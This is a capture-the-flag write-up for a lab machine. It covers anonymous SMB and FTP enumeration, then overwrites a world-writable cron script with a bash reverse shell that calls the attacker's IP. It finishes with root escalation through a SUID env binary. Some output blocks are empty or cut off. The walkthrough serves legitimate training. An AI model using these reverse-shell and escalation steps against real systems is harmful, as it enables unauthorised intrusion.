### Enumerate the machine. How many ports are open?
As for each CTF, we will start the recognition with a scan of the ports of the machine. Here I am using the "-sC" and "-sV" options to use the default scripts and get informations about the services that are running. 
```bash
$ sudo nmap -sC -sV 10.10.134.90
# Nmap 7.91 scan initiated Tue Aug 10 14:53:00 2021 as: nmap -sC -sV 10.10.134.90

```
We see that we have 4 open ports on the machine. 
#### `Answer : 4`

### What service is running on port 21?
Even if in most cases it is the "ftp" service that runs behind port 21 we have to check. 
```bash
$ sudo nmap -sV -p21 10.10.134.90
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 14:55 CEST

```
We have our answer, it's the ftp service behind port 21 
#### `Answer : ftp`

### What service is running on ports 139 and 445?
Again we can run a little port scan to check what is behind those ports.
```bash
$ sudo nmap -sV -p139,445 10.10.134.90

Generally the Samba service which is the implementation of the smb protocol (The SMB protocol is a protocol allowing the sharing of resources on local networks) under Unix uses ports 139 and 445 and here it is indeed the case. 
#### `Answer : smb`

### There's a share on the user's computer.  What's it called?
After our scans we know that Samba is running on the victim's pc. We can try to see if the pc is sharing things. For that I will try to connect in anonymous, ie without passwords to the pc thanks to "smbclient". 
```bash
$ smbclient -L ////10.10.134.90     
Enter WORKGROUP\LaGelee's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
We find a disk called "peaks". The other two "print$" and "IPC$" are default things.  
#### `Answer : pics`

### user.txt
Now I connect to the "pics" disk to see what is hiding and I will get what it contains.
```bash
$ smbclient \\\\10.10.134.90\\pics                                                               1 тип

At first I thought it was steganography and I tried everything but without success ... However remember, we had 4 ports open including 1 FTP. I then connect in "anonymous" to the FTP, that is to say without passwords to see what is hiding. 
```bash
$ ftp 10.10.134.90

```
We encountered a "scripts" directory which is available to us for reading and writing thanks to the "drwxrwxrwx" notes and various files in this directory. 

A "to_do.txt" file.
```bash
$ cat to_do.txt 
I really need to disable the anonymous login...it's really not safe
```
A "removed_files.log" file.
```
$ cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
[...]
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```
And a "clean.sh" script.
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
If we analyze everything, we find the line 'echo "Running cleanup script: nothing to delete" >> /var/ftp/scripts/removed_files.log' which when executed will add in a file "removed_files.log" the line "Running cleanup script: nothing to delete". Since the "removed_files.log" file we found does indeed contain the line "Running cleanup script: nothing to delete" a lot of times I thought that our "clean.sh" script is being executed quite frequently. If you remember correctly, in the ftp server you can write in the "scripts" folder but you can also modify the "clean.sh" file.
```bash
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
```
We can therefore modify the file and install a reverse shell. I am using a bash reverse shell with my ip "10.6.58.124" and port 4444.
```bash
$ cat clean.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.6.58.124/4444 0>&1
```
I can then put the file on the ftp server and run a listener on my pc.
```bash
$ ftp 10.10.11.38
Connected to 10.10.11.38.

Magic, we have a shell on the server. Now let's find the flag.

### root.txt
To get the root flag we need to elevate our privileges. For that I uploaded the script [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to the machine and I executed it. While digging into the result of the script I came across this.
```bash
тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХг Interesting Files тХатХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР

```
We are not supposed to find the command "/usr/bin/env" here. With the SUID it has the power to change our uid to "root" so let's try to exploit that.
![GTF](./assets/Anonymous/GTF.png)
The GTFOBins site tells us how to use the command to gain root privileges.
```bash
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

```
It's good, we're root. Let's go get our flag. 
```bash
cat /root/root.txt
